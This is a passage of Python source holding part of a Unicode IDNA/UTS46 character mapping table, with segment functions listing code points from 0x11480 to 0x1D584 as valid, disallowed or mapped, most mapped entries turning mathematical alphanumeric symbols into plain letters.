\'X\'),\n    (0x11480, \'V\'),\n    (0x114C8, \'X\'),\n    (0x114D0, \'V\'),\n    (0x114DA, \'X\'),\n    (0x11580, \'V\'),\n    (0x115B6, \'X\'),\n    (0x115B8, \'V\'),\n    (0x115DE, \'X\'),\n    (0x11600, \'V\'),\n    (0x11645, \'X\'),\n    (0x11650, \'V\'),\n    (0x1165A, \'X\'),\n    (0x11660, \'V\'),\n    (0x1166D, \'X\'),\n    (0x11680, \'V\'),\n    (0x116BA, \'X\'),\n    (0x116C0, \'V\'),\n    (0x116CA, \'X\'),\n    (0x11700, \'V\'),\n    (0x1171B, \'X\'),\n    (0x1171D, \'V\'),\n    (0x1172C, \'X\'),\n    (0x11730, \'V\'),\n    (0x11747, \'X\'),\n    (0x11800, \'V\'),\n    (0x1183C, \'X\'),\n    (0x118A0, \'M\', \'\xf0\x91\xa3\x80\'),\n    (0x118A1, \'M\', \'\xf0\x91\xa3\x81\'),\n    (0x118A2, \'M\', \'\xf0\x91\xa3\x82\'),\n    (0x118A3, \'M\', \'\xf0\x91\xa3\x83\'),\n    (0x118A4, \'M\', \'\xf0\x91\xa3\x84\'),\n    (0x118A5, \'M\', \'\xf0\x91\xa3\x85\'),\n    (0x118A6, \'M\', \'\xf0\x91\xa3\x86\'),\n    ]\n\ndef _seg_58() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x118A7, \'M\', \'\xf0\x91\xa3\x87\'),\n    (0x118A8, \'M\', \'\xf0\x91\xa3\x88\'),\n    (0x118A9, \'M\', \'\xf0\x91\xa3\x89\'),\n    (0x118AA, \'M\', \'\xf0\x91\xa3\x8a\'),\n    (0x118AB, \'M\', \'\xf0\x91\xa3\x8b\'),\n    (0x118AC, \'M\', \'\xf0\x91\xa3\x8c\'),\n    (0x118AD, \'M\', \'\xf0\x91\xa3\x8d\'),\n    (0x118AE, \'M\', \'\xf0\x91\xa3\x8e\'),\n    (0x118AF, \'M\', \'\xf0\x91\xa3\x8f\'),\n    (0x118B0, \'M\', \'\xf0\x91\xa3\x90\'),\n    (0x118B1, \'M\', \'\xf0\x91\xa3\x91\'),\n    (0x118B2, \'M\', \'\xf0\x91\xa3\x92\'),\n    (0x118B3, \'M\', \'\xf0\x91\xa3\x93\'),\n    (0x118B4, \'M\', \'\xf0\x91\xa3\x94\'),\n    (0x118B5, \'M\', \'\xf0\x91\xa3\x95\'),\n    (0x118B6, \'M\', \'\xf0\x91\xa3\x96\'),\n    (0x118B7, \'M\', \'\xf0\x91\xa3\x97\'),\n    (0x118B8, \'M\', \'\xf0\x91\xa3\x98\'),\n    (0x118B9, \'M\', \'\xf0\x91\xa3\x99\'),\n    (0x118BA, \'M\', \'\xf0\x91\xa3\x9a\'),\n    (0x118BB, \'M\', \'\xf0\x91\xa3\x9b\'),\n    (0x118BC, \'M\', \'\xf0\x91\xa3\x9c\'),\n    (0x118BD, \'M\', \'\xf0\x91\xa3\x9d\'),\n    (0x118BE, \'M\', \'\xf0\x91\xa3\x9e\'),\n    (0x118BF, \'M\', \'\xf0\x91\xa3\x9f\'),\n    (0x118C0, \'V\'),\n    (0x118F3, \'X\'),\n    (0x118FF, \'V\'),\n    (0x11907, \'X\'),\n    (0x11909, \'V\'),\n    (0x1190A, \'X\'),\n    (0x1190C, \'V\'),\n    (0x11914, \'X\'),\n    (0x11915, \'V\'),\n    (0x11917, \'X\'),\n    (0x11918, \'V\'),\n    (0x11936, \'X\'),\n    (0x11937, \'V\'),\n    (0x11939, \'X\'),\n    (0x1193B, \'V\'),\n    (0x11947, \'X\'),\n    (0x11950, \'V\'),\n    (0x1195A, \'X\'),\n    (0x119A0, \'V\'),\n    (0x119A8, \'X\'),\n    (0x119AA, \'V\'),\n    (0x119D8, \'X\'),\n    (0x119DA, \'V\'),\n    (0x119E5, \'X\'),\n    (0x11A00, \'V\'),\n    (0x11A48, \'X\'),\n    (0x11A50, \'V\'),\n    (0x11AA3, \'X\'),\n    (0x11AB0, \'V\'),\n    (0x11AF9, \'X\'),\n    (0x11C00, \'V\'),\n    (0x11C09, \'X\'),\n    (0x11C0A, \'V\'),\n    (0x11C37, \'X\'),\n    (0x11C38, \'V\'),\n    (0x11C46, \'X\'),\n    (0x11C50, \'V\'),\n    (0x11C6D, \'X\'),\n    (0x11C70, \'V\'),\n    (0x11C90, \'X\'),\n    (0x11C92, \'V\'),\n    (0x11CA8, \'X\'),\n    (0x11CA9, \'V\'),\n    (0x11CB7, \'X\'),\n    (0x11D00, \'V\'),\n    (0x11D07, \'X\'),\n    (0x11D08, \'V\'),\n    (0x11D0A, \'X\'),\n    (0x11D0B, \'V\'),\n    (0x11D37, \'X\'),\n    (0x11D3A, \'V\'),\n    (0x11D3B, \'X\'),\n    (0x11D3C, \'V\'),\n    (0x11D3E, \'X\'),\n    (0x11D3F, \'V\'),\n    (0x11D48, \'X\'),\n    (0x11D50, \'V\'),\n    (0x11D5A, \'X\'),\n    (0x11D60, \'V\'),\n    (0x11D66, \'X\'),\n    (0x11D67, \'V\'),\n    (0x11D69, \'X\'),\n    (0x11D6A, \'V\'),\n    (0x11D8F, \'X\'),\n    (0x11D90, \'V\'),\n    (0x11D92, \'X\'),\n    (0x11D93, \'V\'),\n    (0x11D99, \'X\'),\n    (0x11DA0, \'V\'),\n    (0x11DAA, \'X\'),\n    (0x11EE0, \'V\'),\n    (0x11EF9, \'X\'),\n    (0x11FB0, \'V\'),\n    (0x11FB1, \'X\'),\n    (0x11FC0, \'V\'),\n    ]\n\ndef _seg_59() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x11FF2, \'X\'),\n    (0x11FFF, \'V\'),\n    (0x1239A, \'X\'),\n    (0x12400, \'V\'),\n    (0x1246F, \'X\'),\n    (0x12470, \'V\'),\n    (0x12475, \'X\'),\n    (0x12480, \'V\'),\n    (0x12544, \'X\'),\n    (0x12F90, \'V\'),\n    (0x12FF3, \'X\'),\n    (0x13000, \'V\'),\n    (0x1342F, \'X\'),\n    (0x14400, \'V\'),\n    (0x14647, \'X\'),\n    (0x16800, \'V\'),\n    (0x16A39, \'X\'),\n    (0x16A40, \'V\'),\n    (0x16A5F, \'X\'),\n    (0x16A60, \'V\'),\n    (0x16A6A, \'X\'),\n    (0x16A6E, \'V\'),\n    (0x16ABF, \'X\'),\n    (0x16AC0, \'V\'),\n    (0x16ACA, \'X\'),\n    (0x16AD0, \'V\'),\n    (0x16AEE, \'X\'),\n    (0x16AF0, \'V\'),\n    (0x16AF6, \'X\'),\n    (0x16B00, \'V\'),\n    (0x16B46, \'X\'),\n    (0x16B50, \'V\'),\n    (0x16B5A, \'X\'),\n    (0x16B5B, \'V\'),\n    (0x16B62, \'X\'),\n    (0x16B63, \'V\'),\n    (0x16B78, \'X\'),\n    (0x16B7D, \'V\'),\n    (0x16B90, \'X\'),\n    (0x16E40, \'M\', \'\xf0\x96\xb9\xa0\'),\n    (0x16E41, \'M\', \'\xf0\x96\xb9\xa1\'),\n    (0x16E42, \'M\', \'\xf0\x96\xb9\xa2\'),\n    (0x16E43, \'M\', \'\xf0\x96\xb9\xa3\'),\n    (0x16E44, \'M\', \'\xf0\x96\xb9\xa4\'),\n    (0x16E45, \'M\', \'\xf0\x96\xb9\xa5\'),\n    (0x16E46, \'M\', \'\xf0\x96\xb9\xa6\'),\n    (0x16E47, \'M\', \'\xf0\x96\xb9\xa7\'),\n    (0x16E48, \'M\', \'\xf0\x96\xb9\xa8\'),\n    (0x16E49, \'M\', \'\xf0\x96\xb9\xa9\'),\n    (0x16E4A, \'M\', \'\xf0\x96\xb9\xaa\'),\n    (0x16E4B, \'M\', \'\xf0\x96\xb9\xab\'),\n    (0x16E4C, \'M\', \'\xf0\x96\xb9\xac\'),\n    (0x16E4D, \'M\', \'\xf0\x96\xb9\xad\'),\n    (0x16E4E, \'M\', \'\xf0\x96\xb9\xae\'),\n    (0x16E4F, \'M\', \'\xf0\x96\xb9\xaf\'),\n    (0x16E50, \'M\', \'\xf0\x96\xb9\xb0\'),\n    (0x16E51, \'M\', \'\xf0\x96\xb9\xb1\'),\n    (0x16E52, \'M\', \'\xf0\x96\xb9\xb2\'),\n    (0x16E53, \'M\', \'\xf0\x96\xb9\xb3\'),\n    (0x16E54, \'M\', \'\xf0\x96\xb9\xb4\'),\n    (0x16E55, \'M\', \'\xf0\x96\xb9\xb5\'),\n    (0x16E56, \'M\', \'\xf0\x96\xb9\xb6\'),\n    (0x16E57, \'M\', \'\xf0\x96\xb9\xb7\'),\n    (0x16E58, \'M\', \'\xf0\x96\xb9\xb8\'),\n    (0x16E59, \'M\', \'\xf0\x96\xb9\xb9\'),\n    (0x16E5A, \'M\', \'\xf0\x96\xb9\xba\'),\n    (0x16E5B, \'M\', \'\xf0\x96\xb9\xbb\'),\n    (0x16E5C, \'M\', \'\xf0\x96\xb9\xbc\'),\n    (0x16E5D, \'M\', \'\xf0\x96\xb9\xbd\'),\n    (0x16E5E, \'M\', \'\xf0\x96\xb9\xbe\'),\n    (0x16E5F, \'M\', \'\xf0\x96\xb9\xbf\'),\n    (0x16E60, \'V\'),\n    (0x16E9B, \'X\'),\n    (0x16F00, \'V\'),\n    (0x16F4B, \'X\'),\n    (0x16F4F, \'V\'),\n    (0x16F88, \'X\'),\n    (0x16F8F, \'V\'),\n    (0x16FA0, \'X\'),\n    (0x16FE0, \'V\'),\n    (0x16FE5, \'X\'),\n    (0x16FF0, \'V\'),\n    (0x16FF2, \'X\'),\n    (0x17000, \'V\'),\n    (0x187F8, \'X\'),\n    (0x18800, \'V\'),\n    (0x18CD6, \'X\'),\n    (0x18D00, \'V\'),\n    (0x18D09, \'X\'),\n    (0x1AFF0, \'V\'),\n    (0x1AFF4, \'X\'),\n    (0x1AFF5, \'V\'),\n    (0x1AFFC, \'X\'),\n    (0x1AFFD, \'V\'),\n    (0x1AFFF, \'X\'),\n    (0x1B000, \'V\'),\n    (0x1B123, \'X\'),\n    (0x1B150, \'V\'),\n    (0x1B153, \'X\'),\n    (0x1B164, \'V\'),\n    ]\n\ndef _seg_60() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1B168, \'X\'),\n    (0x1B170, \'V\'),\n    (0x1B2FC, \'X\'),\n    (0x1BC00, \'V\'),\n    (0x1BC6B, \'X\'),\n    (0x1BC70, \'V\'),\n    (0x1BC7D, \'X\'),\n    (0x1BC80, \'V\'),\n    (0x1BC89, \'X\'),\n    (0x1BC90, \'V\'),\n    (0x1BC9A, \'X\'),\n    (0x1BC9C, \'V\'),\n    (0x1BCA0, \'I\'),\n    (0x1BCA4, \'X\'),\n    (0x1CF00, \'V\'),\n    (0x1CF2E, \'X\'),\n    (0x1CF30, \'V\'),\n    (0x1CF47, \'X\'),\n    (0x1CF50, \'V\'),\n    (0x1CFC4, \'X\'),\n    (0x1D000, \'V\'),\n    (0x1D0F6, \'X\'),\n    (0x1D100, \'V\'),\n    (0x1D127, \'X\'),\n    (0x1D129, \'V\'),\n    (0x1D15E, \'M\', \'\xf0\x9d\x85\x97\xf0\x9d\x85\xa5\'),\n    (0x1D15F, \'M\', \'\xf0\x9d\x85\x98\xf0\x9d\x85\xa5\'),\n    (0x1D160, \'M\', \'\xf0\x9d\x85\x98\xf0\x9d\x85\xa5\xf0\x9d\x85\xae\'),\n    (0x1D161, \'M\', \'\xf0\x9d\x85\x98\xf0\x9d\x85\xa5\xf0\x9d\x85\xaf\'),\n    (0x1D162, \'M\', \'\xf0\x9d\x85\x98\xf0\x9d\x85\xa5\xf0\x9d\x85\xb0\'),\n    (0x1D163, \'M\', \'\xf0\x9d\x85\x98\xf0\x9d\x85\xa5\xf0\x9d\x85\xb1\'),\n    (0x1D164, \'M\', \'\xf0\x9d\x85\x98\xf0\x9d\x85\xa5\xf0\x9d\x85\xb2\'),\n    (0x1D165, \'V\'),\n    (0x1D173, \'X\'),\n    (0x1D17B, \'V\'),\n    (0x1D1BB, \'M\', \'\xf0\x9d\x86\xb9\xf0\x9d\x85\xa5\'),\n    (0x1D1BC, \'M\', \'\xf0\x9d\x86\xba\xf0\x9d\x85\xa5\'),\n    (0x1D1BD, \'M\', \'\xf0\x9d\x86\xb9\xf0\x9d\x85\xa5\xf0\x9d\x85\xae\'),\n    (0x1D1BE, \'M\', \'\xf0\x9d\x86\xba\xf0\x9d\x85\xa5\xf0\x9d\x85\xae\'),\n    (0x1D1BF, \'M\', \'\xf0\x9d\x86\xb9\xf0\x9d\x85\xa5\xf0\x9d\x85\xaf\'),\n    (0x1D1C0, \'M\', \'\xf0\x9d\x86\xba\xf0\x9d\x85\xa5\xf0\x9d\x85\xaf\'),\n    (0x1D1C1, \'V\'),\n    (0x1D1EB, \'X\'),\n    (0x1D200, \'V\'),\n    (0x1D246, \'X\'),\n    (0x1D2E0, \'V\'),\n    (0x1D2F4, \'X\'),\n    (0x1D300, \'V\'),\n    (0x1D357, \'X\'),\n    (0x1D360, \'V\'),\n    (0x1D379, \'X\'),\n    (0x1D400, \'M\', \'a\'),\n    (0x1D401, \'M\', \'b\'),\n    (0x1D402, \'M\', \'c\'),\n    (0x1D403, \'M\', \'d\'),\n    (0x1D404, \'M\', \'e\'),\n    (0x1D405, \'M\', \'f\'),\n    (0x1D406, \'M\', \'g\'),\n    (0x1D407, \'M\', \'h\'),\n    (0x1D408, \'M\', \'i\'),\n    (0x1D409, \'M\', \'j\'),\n    (0x1D40A, \'M\', \'k\'),\n    (0x1D40B, \'M\', \'l\'),\n    (0x1D40C, \'M\', \'m\'),\n    (0x1D40D, \'M\', \'n\'),\n    (0x1D40E, \'M\', \'o\'),\n    (0x1D40F, \'M\', \'p\'),\n    (0x1D410, \'M\', \'q\'),\n    (0x1D411, \'M\', \'r\'),\n    (0x1D412, \'M\', \'s\'),\n    (0x1D413, \'M\', \'t\'),\n    (0x1D414, \'M\', \'u\'),\n    (0x1D415, \'M\', \'v\'),\n    (0x1D416, \'M\', \'w\'),\n    (0x1D417, \'M\', \'x\'),\n    (0x1D418, \'M\', \'y\'),\n    (0x1D419, \'M\', \'z\'),\n    (0x1D41A, \'M\', \'a\'),\n    (0x1D41B, \'M\', \'b\'),\n    (0x1D41C, \'M\', \'c\'),\n    (0x1D41D, \'M\', \'d\'),\n    (0x1D41E, \'M\', \'e\'),\n    (0x1D41F, \'M\', \'f\'),\n    (0x1D420, \'M\', \'g\'),\n    (0x1D421, \'M\', \'h\'),\n    (0x1D422, \'M\', \'i\'),\n    (0x1D423, \'M\', \'j\'),\n    (0x1D424, \'M\', \'k\'),\n    (0x1D425, \'M\', \'l\'),\n    (0x1D426, \'M\', \'m\'),\n    (0x1D427, \'M\', \'n\'),\n    (0x1D428, \'M\', \'o\'),\n    (0x1D429, \'M\', \'p\'),\n    (0x1D42A, \'M\', \'q\'),\n    (0x1D42B, \'M\', \'r\'),\n    (0x1D42C, \'M\', \'s\'),\n    (0x1D42D, \'M\', \'t\'),\n    (0x1D42E, \'M\', \'u\'),\n    (0x1D42F, \'M\', \'v\'),\n    (0x1D430, \'M\', \'w\'),\n    ]\n\ndef _seg_61() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D431, \'M\', \'x\'),\n    (0x1D432, \'M\', \'y\'),\n    (0x1D433, \'M\', \'z\'),\n    (0x1D434, \'M\', \'a\'),\n    (0x1D435, \'M\', \'b\'),\n    (0x1D436, \'M\', \'c\'),\n    (0x1D437, \'M\', \'d\'),\n    (0x1D438, \'M\', \'e\'),\n    (0x1D439, \'M\', \'f\'),\n    (0x1D43A, \'M\', \'g\'),\n    (0x1D43B, \'M\', \'h\'),\n    (0x1D43C, \'M\', \'i\'),\n    (0x1D43D, \'M\', \'j\'),\n    (0x1D43E, \'M\', \'k\'),\n    (0x1D43F, \'M\', \'l\'),\n    (0x1D440, \'M\', \'m\'),\n    (0x1D441, \'M\', \'n\'),\n    (0x1D442, \'M\', \'o\'),\n    (0x1D443, \'M\', \'p\'),\n    (0x1D444, \'M\', \'q\'),\n    (0x1D445, \'M\', \'r\'),\n    (0x1D446, \'M\', \'s\'),\n    (0x1D447, \'M\', \'t\'),\n    (0x1D448, \'M\', \'u\'),\n    (0x1D449, \'M\', \'v\'),\n    (0x1D44A, \'M\', \'w\'),\n    (0x1D44B, \'M\', \'x\'),\n    (0x1D44C, \'M\', \'y\'),\n    (0x1D44D, \'M\', \'z\'),\n    (0x1D44E, \'M\', \'a\'),\n    (0x1D44F, \'M\', \'b\'),\n    (0x1D450, \'M\', \'c\'),\n    (0x1D451, \'M\', \'d\'),\n    (0x1D452, \'M\', \'e\'),\n    (0x1D453, \'M\', \'f\'),\n    (0x1D454, \'M\', \'g\'),\n    (0x1D455, \'X\'),\n    (0x1D456, \'M\', \'i\'),\n    (0x1D457, \'M\', \'j\'),\n    (0x1D458, \'M\', \'k\'),\n    (0x1D459, \'M\', \'l\'),\n    (0x1D45A, \'M\', \'m\'),\n    (0x1D45B, \'M\', \'n\'),\n    (0x1D45C, \'M\', \'o\'),\n    (0x1D45D, \'M\', \'p\'),\n    (0x1D45E, \'M\', \'q\'),\n    (0x1D45F, \'M\', \'r\'),\n    (0x1D460, \'M\', \'s\'),\n    (0x1D461, \'M\', \'t\'),\n    (0x1D462, \'M\', \'u\'),\n    (0x1D463, \'M\', \'v\'),\n    (0x1D464, \'M\', \'w\'),\n    (0x1D465, \'M\', \'x\'),\n    (0x1D466, \'M\', \'y\'),\n    (0x1D467, \'M\', \'z\'),\n    (0x1D468, \'M\', \'a\'),\n    (0x1D469, \'M\', \'b\'),\n    (0x1D46A, \'M\', \'c\'),\n    (0x1D46B, \'M\', \'d\'),\n    (0x1D46C, \'M\', \'e\'),\n    (0x1D46D, \'M\', \'f\'),\n    (0x1D46E, \'M\', \'g\'),\n    (0x1D46F, \'M\', \'h\'),\n    (0x1D470, \'M\', \'i\'),\n    (0x1D471, \'M\', \'j\'),\n    (0x1D472, \'M\', \'k\'),\n    (0x1D473, \'M\', \'l\'),\n    (0x1D474, \'M\', \'m\'),\n    (0x1D475, \'M\', \'n\'),\n    (0x1D476, \'M\', \'o\'),\n    (0x1D477, \'M\', \'p\'),\n    (0x1D478, \'M\', \'q\'),\n    (0x1D479, \'M\', \'r\'),\n    (0x1D47A, \'M\', \'s\'),\n    (0x1D47B, \'M\', \'t\'),\n    (0x1D47C, \'M\', \'u\'),\n    (0x1D47D, \'M\', \'v\'),\n    (0x1D47E, \'M\', \'w\'),\n    (0x1D47F, \'M\', \'x\'),\n    (0x1D480, \'M\', \'y\'),\n    (0x1D481, \'M\', \'z\'),\n    (0x1D482, \'M\', \'a\'),\n    (0x1D483, \'M\', \'b\'),\n    (0x1D484, \'M\', \'c\'),\n    (0x1D485, \'M\', \'d\'),\n    (0x1D486, \'M\', \'e\'),\n    (0x1D487, \'M\', \'f\'),\n    (0x1D488, \'M\', \'g\'),\n    (0x1D489, \'M\', \'h\'),\n    (0x1D48A, \'M\', \'i\'),\n    (0x1D48B, \'M\', \'j\'),\n    (0x1D48C, \'M\', \'k\'),\n    (0x1D48D, \'M\', \'l\'),\n    (0x1D48E, \'M\', \'m\'),\n    (0x1D48F, \'M\', \'n\'),\n    (0x1D490, \'M\', \'o\'),\n    (0x1D491, \'M\', \'p\'),\n    (0x1D492, \'M\', \'q\'),\n    (0x1D493, \'M\', \'r\'),\n    (0x1D494, \'M\', \'s\'),\n    ]\n\ndef _seg_62() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D495, \'M\', \'t\'),\n    (0x1D496, \'M\', \'u\'),\n    (0x1D497, \'M\', \'v\'),\n    (0x1D498, \'M\', \'w\'),\n    (0x1D499, \'M\', \'x\'),\n    (0x1D49A, \'M\', \'y\'),\n    (0x1D49B, \'M\', \'z\'),\n    (0x1D49C, \'M\', \'a\'),\n    (0x1D49D, \'X\'),\n    (0x1D49E, \'M\', \'c\'),\n    (0x1D49F, \'M\', \'d\'),\n    (0x1D4A0, \'X\'),\n    (0x1D4A2, \'M\', \'g\'),\n    (0x1D4A3, \'X\'),\n    (0x1D4A5, \'M\', \'j\'),\n    (0x1D4A6, \'M\', \'k\'),\n    (0x1D4A7, \'X\'),\n    (0x1D4A9, \'M\', \'n\'),\n    (0x1D4AA, \'M\', \'o\'),\n    (0x1D4AB, \'M\', \'p\'),\n    (0x1D4AC, \'M\', \'q\'),\n    (0x1D4AD, \'X\'),\n    (0x1D4AE, \'M\', \'s\'),\n    (0x1D4AF, \'M\', \'t\'),\n    (0x1D4B0, \'M\', \'u\'),\n    (0x1D4B1, \'M\', \'v\'),\n    (0x1D4B2, \'M\', \'w\'),\n    (0x1D4B3, \'M\', \'x\'),\n    (0x1D4B4, \'M\', \'y\'),\n    (0x1D4B5, \'M\', \'z\'),\n    (0x1D4B6, \'M\', \'a\'),\n    (0x1D4B7, \'M\', \'b\'),\n    (0x1D4B8, \'M\', \'c\'),\n    (0x1D4B9, \'M\', \'d\'),\n    (0x1D4BA, \'X\'),\n    (0x1D4BB, \'M\', \'f\'),\n    (0x1D4BC, \'X\'),\n    (0x1D4BD, \'M\', \'h\'),\n    (0x1D4BE, \'M\', \'i\'),\n    (0x1D4BF, \'M\', \'j\'),\n    (0x1D4C0, \'M\', \'k\'),\n    (0x1D4C1, \'M\', \'l\'),\n    (0x1D4C2, \'M\', \'m\'),\n    (0x1D4C3, \'M\', \'n\'),\n    (0x1D4C4, \'X\'),\n    (0x1D4C5, \'M\', \'p\'),\n    (0x1D4C6, \'M\', \'q\'),\n    (0x1D4C7, \'M\', \'r\'),\n    (0x1D4C8, \'M\', \'s\'),\n    (0x1D4C9, \'M\', \'t\'),\n    (0x1D4CA, \'M\', \'u\'),\n    (0x1D4CB, \'M\', \'v\'),\n    (0x1D4CC, \'M\', \'w\'),\n    (0x1D4CD, \'M\', \'x\'),\n    (0x1D4CE, \'M\', \'y\'),\n    (0x1D4CF, \'M\', \'z\'),\n    (0x1D4D0, \'M\', \'a\'),\n    (0x1D4D1, \'M\', \'b\'),\n    (0x1D4D2, \'M\', \'c\'),\n    (0x1D4D3, \'M\', \'d\'),\n    (0x1D4D4, \'M\', \'e\'),\n    (0x1D4D5, \'M\', \'f\'),\n    (0x1D4D6, \'M\', \'g\'),\n    (0x1D4D7, \'M\', \'h\'),\n    (0x1D4D8, \'M\', \'i\'),\n    (0x1D4D9, \'M\', \'j\'),\n    (0x1D4DA, \'M\', \'k\'),\n    (0x1D4DB, \'M\', \'l\'),\n    (0x1D4DC, \'M\', \'m\'),\n    (0x1D4DD, \'M\', \'n\'),\n    (0x1D4DE, \'M\', \'o\'),\n    (0x1D4DF, \'M\', \'p\'),\n    (0x1D4E0, \'M\', \'q\'),\n    (0x1D4E1, \'M\', \'r\'),\n    (0x1D4E2, \'M\', \'s\'),\n    (0x1D4E3, \'M\', \'t\'),\n    (0x1D4E4, \'M\', \'u\'),\n    (0x1D4E5, \'M\', \'v\'),\n    (0x1D4E6, \'M\', \'w\'),\n    (0x1D4E7, \'M\', \'x\'),\n    (0x1D4E8, \'M\', \'y\'),\n    (0x1D4E9, \'M\', \'z\'),\n    (0x1D4EA, \'M\', \'a\'),\n    (0x1D4EB, \'M\', \'b\'),\n    (0x1D4EC, \'M\', \'c\'),\n    (0x1D4ED, \'M\', \'d\'),\n    (0x1D4EE, \'M\', \'e\'),\n    (0x1D4EF, \'M\', \'f\'),\n    (0x1D4F0, \'M\', \'g\'),\n    (0x1D4F1, \'M\', \'h\'),\n    (0x1D4F2, \'M\', \'i\'),\n    (0x1D4F3, \'M\', \'j\'),\n    (0x1D4F4, \'M\', \'k\'),\n    (0x1D4F5, \'M\', \'l\'),\n    (0x1D4F6, \'M\', \'m\'),\n    (0x1D4F7, \'M\', \'n\'),\n    (0x1D4F8, \'M\', \'o\'),\n    (0x1D4F9, \'M\', \'p\'),\n    (0x1D4FA, \'M\', \'q\'),\n    (0x1D4FB, \'M\', \'r\'),\n    ]\n\ndef _seg_63() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D4FC, \'M\', \'s\'),\n    (0x1D4FD, \'M\', \'t\'),\n    (0x1D4FE, \'M\', \'u\'),\n    (0x1D4FF, \'M\', \'v\'),\n    (0x1D500, \'M\', \'w\'),\n    (0x1D501, \'M\', \'x\'),\n    (0x1D502, \'M\', \'y\'),\n    (0x1D503, \'M\', \'z\'),\n    (0x1D504, \'M\', \'a\'),\n    (0x1D505, \'M\', \'b\'),\n    (0x1D506, \'X\'),\n    (0x1D507, \'M\', \'d\'),\n    (0x1D508, \'M\', \'e\'),\n    (0x1D509, \'M\', \'f\'),\n    (0x1D50A, \'M\', \'g\'),\n    (0x1D50B, \'X\'),\n    (0x1D50D, \'M\', \'j\'),\n    (0x1D50E, \'M\', \'k\'),\n    (0x1D50F, \'M\', \'l\'),\n    (0x1D510, \'M\', \'m\'),\n    (0x1D511, \'M\', \'n\'),\n    (0x1D512, \'M\', \'o\'),\n    (0x1D513, \'M\', \'p\'),\n    (0x1D514, \'M\', \'q\'),\n    (0x1D515, \'X\'),\n    (0x1D516, \'M\', \'s\'),\n    (0x1D517, \'M\', \'t\'),\n    (0x1D518, \'M\', \'u\'),\n    (0x1D519, \'M\', \'v\'),\n    (0x1D51A, \'M\', \'w\'),\n    (0x1D51B, \'M\', \'x\'),\n    (0x1D51C, \'M\', \'y\'),\n    (0x1D51D, \'X\'),\n    (0x1D51E, \'M\', \'a\'),\n    (0x1D51F, \'M\', \'b\'),\n    (0x1D520, \'M\', \'c\'),\n    (0x1D521, \'M\', \'d\'),\n    (0x1D522, \'M\', \'e\'),\n    (0x1D523, \'M\', \'f\'),\n    (0x1D524, \'M\', \'g\'),\n    (0x1D525, \'M\', \'h\'),\n    (0x1D526, \'M\', \'i\'),\n    (0x1D527, \'M\', \'j\'),\n    (0x1D528, \'M\', \'k\'),\n    (0x1D529, \'M\', \'l\'),\n    (0x1D52A, \'M\', \'m\'),\n    (0x1D52B, \'M\', \'n\'),\n    (0x1D52C, \'M\', \'o\'),\n    (0x1D52D, \'M\', \'p\'),\n    (0x1D52E, \'M\', \'q\'),\n    (0x1D52F, \'M\', \'r\'),\n    (0x1D530, \'M\', \'s\'),\n    (0x1D531, \'M\', \'t\'),\n    (0x1D532, \'M\', \'u\'),\n    (0x1D533, \'M\', \'v\'),\n    (0x1D534, \'M\', \'w\'),\n    (0x1D535, \'M\', \'x\'),\n    (0x1D536, \'M\', \'y\'),\n    (0x1D537, \'M\', \'z\'),\n    (0x1D538, \'M\', \'a\'),\n    (0x1D539, \'M\', \'b\'),\n    (0x1D53A, \'X\'),\n    (0x1D53B, \'M\', \'d\'),\n    (0x1D53C, \'M\', \'e\'),\n    (0x1D53D, \'M\', \'f\'),\n    (0x1D53E, \'M\', \'g\'),\n    (0x1D53F, \'X\'),\n    (0x1D540, \'M\', \'i\'),\n    (0x1D541, \'M\', \'j\'),\n    (0x1D542, \'M\', \'k\'),\n    (0x1D543, \'M\', \'l\'),\n    (0x1D544, \'M\', \'m\'),\n    (0x1D545, \'X\'),\n    (0x1D546, \'M\', \'o\'),\n    (0x1D547, \'X\'),\n    (0x1D54A, \'M\', \'s\'),\n    (0x1D54B, \'M\', \'t\'),\n    (0x1D54C, \'M\', \'u\'),\n    (0x1D54D, \'M\', \'v\'),\n    (0x1D54E, \'M\', \'w\'),\n    (0x1D54F, \'M\', \'x\'),\n    (0x1D550, \'M\', \'y\'),\n    (0x1D551, \'X\'),\n    (0x1D552, \'M\', \'a\'),\n    (0x1D553, \'M\', \'b\'),\n    (0x1D554, \'M\', \'c\'),\n    (0x1D555, \'M\', \'d\'),\n    (0x1D556, \'M\', \'e\'),\n    (0x1D557, \'M\', \'f\'),\n    (0x1D558, \'M\', \'g\'),\n    (0x1D559, \'M\', \'h\'),\n    (0x1D55A, \'M\', \'i\'),\n    (0x1D55B, \'M\', \'j\'),\n    (0x1D55C, \'M\', \'k\'),\n    (0x1D55D, \'M\', \'l\'),\n    (0x1D55E, \'M\', \'m\'),\n    (0x1D55F, \'M\', \'n\'),\n    (0x1D560, \'M\', \'o\'),\n    (0x1D561, \'M\', \'p\'),\n    (0x1D562, \'M\', \'q\'),\n    ]\n\ndef _seg_64() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D563, \'M\', \'r\'),\n    (0x1D564, \'M\', \'s\'),\n    (0x1D565, \'M\', \'t\'),\n    (0x1D566, \'M\', \'u\'),\n    (0x1D567, \'M\', \'v\'),\n    (0x1D568, \'M\', \'w\'),\n    (0x1D569, \'M\', \'x\'),\n    (0x1D56A, \'M\', \'y\'),\n    (0x1D56B, \'M\', \'z\'),\n    (0x1D56C, \'M\', \'a\'),\n    (0x1D56D, \'M\', \'b\'),\n    (0x1D56E, \'M\', \'c\'),\n    (0x1D56F, \'M\', \'d\'),\n    (0x1D570, \'M\', \'e\'),\n    (0x1D571, \'M\', \'f\'),\n    (0x1D572, \'M\', \'g\'),\n    (0x1D573, \'M\', \'h\'),\n    (0x1D574, \'M\', \'i\'),\n    (0x1D575, \'M\', \'j\'),\n    (0x1D576, \'M\', \'k\'),\n    (0x1D577, \'M\', \'l\'),\n    (0x1D578, \'M\', \'m\'),\n    (0x1D579, \'M\', \'n\'),\n    (0x1D57A, \'M\', \'o\'),\n    (0x1D57B, \'M\', \'p\'),\n    (0x1D57C, \'M\', \'q\'),\n    (0x1D57D, \'M\', \'r\'),\n    (0x1D57E, \'M\', \'s\'),\n    (0x1D57F, \'M\', \'t\'),\n    (0x1D580, \'M\', \'u\'),\n    (0x1D581, \'M\', \'v\'),\n    (0x1D582, \'M\', \'w\'),\n    (0x1D583, \'M\', \'x\'),\n    (0x1D584, 